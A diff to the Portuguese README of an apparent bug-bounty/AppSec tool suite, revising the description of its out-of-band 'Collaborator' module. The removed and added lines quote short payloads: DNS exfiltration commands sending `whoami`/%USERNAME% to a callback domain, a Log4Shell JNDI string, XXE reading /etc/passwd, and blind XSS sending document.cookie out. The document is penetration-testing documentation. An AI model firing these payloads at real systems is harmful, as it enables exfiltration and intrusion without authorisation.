@@ -63,7 +63,7 @@ Acesse a aba **AppSec** no menu principal para utilizar a suíte integrada de ut
 | **3** | **Grafo de Ataque D3.js & Movimentação Lateral** | Visualização topológica conectando Relatórios, CVEs e Domínios Alvo | Simulação física D3.js force-directed com conexões entre domínios de perímetro e VPC interna, relatórios de vulnerabilidade, CVEs (NVD/EPSS), saltos laterais (pivoting) e Crown Jewels corporativos; simulador com autoplay passo a passo, filtros por entidade/domínio e exportação SVG/JSON. |
 | **4** | **CORS Misconfiguration Studio** | Diagnóstico de Cross-Origin Resource Sharing e gerador de exploit PoC | Detecção de reflexão cega de `Origin` com credenciais ativas (`ACAC: true`), confiança indevida na origem `null` (sandbox iframe), regex frágil com ponto não escapado (`targetXcom.com`) ou subdomínio órfão; gera exploit PoC autocontido em HTML com `XMLHttpRequest`/`fetch` e snippets de remediação estrita para Express e Nginx. |
 | **5** | **HTTP Request Smuggling & Desync Inspector** | Análise de discrepâncias de parsing entre Front-end e Back-end | Mapeamento dos vetores `CL.TE`, `TE.CL`, `TE.TE` (ofuscação de header), `H2.TE` (downgrade HTTP/2 para HTTP/1.1) e `CL.0`; visualizador diferencial lado a lado mostrando o resíduo do socket TCP; gerador de scripts em Python de socket puro e Turbo Intruder para testes seguros de timing sem poluir tráfego de produção. |
-| **6** | **Out-of-Band (OOB) Interaction Studio** | Central Collaborator para comprovação de vulnerabilidades cegas | Gerador de tokens dinâmicos para múltiplos protocolos (DNS, HTTP, HTTPS, LDAP); payloads para Blind SSRF (AWS/GCP), Blind XXE (DTD de parâmetro externo), Blind RCE (DNS exfiltration com `dig`/`ping`), OOB-SQLi (`xp_dirtree`/`UTL_INADDR`) e Log4Shell/JNDI; log de callbacks em tempo real e decodificador integrado de subdomínios hexadecimais e base4. |
+| **6** | **OOB (Out-of-Band) Collaborator** | Central Collaborator para testes de interação DNS e HTTP/HTTPS externos | Gerador de hostnames e URLs únicos com tags de correlação (`recon`, `ssrf-api`); biblioteca de payloads para resolução DNS, Blind SSRF (AWS/GCP), Blind XXE (parâmetro externo DTD), Blind RCE (exfiltração DNS com subdomínio `whoami`), OOB-SQLi (`xp_dirtree`/`UTL_INADDR`), Log4Shell/JNDI e Blind XSS; monitor em tempo real de requisições externas com IP, Reverse DNS, GeoIP, cabeçalhos, parâmetros e corpo POST; decodificador integrado de exfiltração (Hex, Base64, URL); exportação JSON/CSV e cópia de evidências em Markdown. |
 | **7** | **Subdomain Takeover Analyzer** | Auditoria e detecção de CNAMEs e registros DNS órfãos | Base de 15 assinaturas de serviços (AWS S3, GitHub Pages, Heroku, Azure, Vercel, Shopify, Zendesk), verificação de respostas HTTP, cálculo de pontuação CVSS v4 e guia de remediação. |
 | **8** | **ReDoS Studio & Catastrophic Backtracking** | Diagnóstico de expressões regulares vulneráveis a retrocesso exponencial | Detecção de quantificadores aninhados `(a+)+`, alternâncias com sobreposição `(a\|aa)+`, simulador de esgotamento de CPU/Event Loop sem travamento do navegador, gerador de payloads maliciosos e substituições seguras em tempo linear $O(n)$ com RE2. |
 | **9** | **Cloud SSRF & Metadata Exploitation Suite** | Catálogo e construtor de exploração SSRF para nuvem | Endpoints e fluxos para AWS EC2 IMDSv1/v2, GCP Metadata, Azure Managed Identity, Kubelet Read-Only e Docker API; matriz completa de evasão de filtros (Decimal DWORD, Hexadecimal, Octal, IPv6-mapped e DNS Rebinding via `nip.io`). |
@@ -300,22 +300,30 @@ Acesse a aba **AppSec** no menu principal para utilizar a suíte integrada de ut
 5. **Mitigação & Hardening**:
    - Implementação de HTTP/2 de ponta a ponta, isolamento de conexões TCP e rejeição RFC 7230/9112 (`400 Bad Request`).
 
-### 15. Como Conduzir Testes Fora-de-Banda para Vulnerabilidades Cegas (OOB Collaborator Studio)
-1. Na aba **AppSec**, selecione **OOB & Collaborator Studio**.
-2. **Geração de Token de Escuta Dinâmico**:
-   - O sistema gera automaticamente um domínio de escuta único (ex: `bb-x7k9p2.bounty-oob.net`).
-   - Fornece endpoints simultâneos para consultas DNS, HTTP, HTTPS e LDAP.
-3. **Biblioteca de Payloads Pré-Formatados**:
-   - **Blind SSRF**: Requisição de webhook com callback OOB e extração de metadados AWS IMDSv1;
-   - **Blind XXE**: Definição de parâmetro externo DTD (`eval.dtd`) exfiltrando `/etc/passwd` via HTTP;
-   - **Blind RCE (DNS Exfiltration)**: Payloads para Linux (`ping -c 1 \`whoami\`.${oob}`) e Windows (`nslookup %USERNAME%.${oob}`);
-   - **OOB-SQLi**: Comandos de gatilho para MSSQL (`master..xp_dirtree`), Oracle (`UTL_INADDR`) e PostgreSQL;
-   - **Log4Shell & JNDI**: Payloads LDAP com interpolação de variáveis de ambiente (`${jndi:ldap://${oob}/a}`).
-4. **Log de Callbacks em Tempo Real & Simulador**:
-   - Monitore interações recebidas com identificação de IP de origem, protocolo e timestamp.
-   - Use os botões de simulação rápida (`+DNS`, `+HTTP`, `+LDAP`) para testar o fluxo de ingestão.
-5. **Decodificador Integrado de Dados Exfiltrados**:
-   - Decodifique instantaneamente subdomínios em formato hexadecimal (ex: `726f6f74` ➔ `root`), strings Base64 e codificação de URL.
+### 15. Como Conduzir Testes de Interação DNS/HTTP e Analisar Logs Fora-de-Banda (OOB Collaborator)
+1. Na aba **AppSec**, selecione **OOB (Out-of-Band) Collaborator**.
+2. **Geração de Hostname Único & Configuração de Servidor**:
+   - O sistema gera automaticamente um domínio de escuta único (ex: `recon-x7k9p2.oob.bugsentinel.internal`) com prefixo/tag de correlação customizável (`recon`, `ssrf-api`, `auth-flow`).
+   - Escolha o servidor base: servidor interno padrão da suite, instâncias públicas `interact.sh` / `burpcollaborator.net` ou configure seu próprio FQDN auto-hospedado.
+   - Copie instantaneamente o **Hostname**, a **URL HTTP** (`http://...`) ou a **URL HTTPS** (`https://...`).
+3. **Geração de Payloads para Testes de Interação DNS & HTTP**:
+   - **DNS Resolution Testing**: Comandos `nslookup`, `dig +short`, exfiltração de subdomínios em Linux (`nslookup $(whoami).${host}`) e Windows (`Resolve-DnsName`), ideal para ambientes com rígido *Egress Filtering* que bloqueiam tráfego HTTP mas permitem UDP/53.
+   - **HTTP / HTTPS Callbacks & Webhooks**: Requisições GET/POST com cabeçalhos de injeção (`X-Forwarded-For`, `X-Real-IP`, `Referer`), webhooks JSON e testes de renderizadores internos de PDF.
+   - **Blind SSRF**: Extração de metadados AWS IMDSv1 e callbacks de assinatura de webhooks.
+   - **Blind XXE**: Parâmetros de entidade externa XML (`eval.dtd`) com exfiltração de `/etc/hostname` via HTTP.
+   - **Blind RCE (Command Injection)**: Túneis DNS concatenados e downloads via `certutil` / `Invoke-WebRequest`.
+   - **Blind SQLi (OOB-SQLi)**: Funções de banco de dados que forçam tráfego SMB ou DNS (`master..xp_dirtree`, `UTL_INADDR.get_host_address`, `COPY ... PROGRAM`).
+   - **Log4Shell & JNDI**: Injeções LDAP na porta 1389 com interpolação de propriedades Java e variáveis de ambiente.
+   - **Blind XSS**: Payloads com tags `<img>` e `<script>` exfiltrando `document.cookie` para o Collaborator.
+4. **Visualização & Monitoramento em Tempo Real de Requisições Externas**:
+   - Acompanhe o feed de interações recebidas em tempo real com identificador de protocolo (`DNS`, `HTTP`, `HTTPS`, `LDAP`), porta e timestamp UTC.
+   - Filtre as requisições por protocolo (`ALL`, `DNS`, `HTTP`, `HTTPS`, `LDAP`) ou realize busca por IP, host ou dados exfiltrados.
+   - Clique em **Inspecionar** para abrir o modal de análise profunda com IP de origem, Reverse DNS, GeoIP, cabeçalhos HTTP brutos, query string, corpo da requisição POST e payload correlacionado.
+   - Clique em **Evidência** para copiar o bloco Markdown formatado com data/hora, IP e cabeçalhos para inclusão imediata no relatório de vulnerabilidade.
+   - Utilize os botões de simulação rápida (`+DNS`, `+GET`, `+POST`, `+LDAP`) para validações controladas.
+   - Exporte o histórico completo de requisições em formato **JSON** ou **CSV**.
+5. **Decodificador de Dados Exfiltrados (OOB Data Workbench)**:
+   - Decodifique instantaneamente dados capturados nos formatos **Hex Subdomain** (ex: `726f6f74` ➔ `root`), **Base64** e **URL Decoded**.
 
 ### 16. Como Gerar Testes de Injeção com o Fuzzer de Payloads & Evasão de WAF (Payload Fuzzer)
 1. Na aba **AppSec**, selecione **Payload Fuzzer & Mutation Engine**.
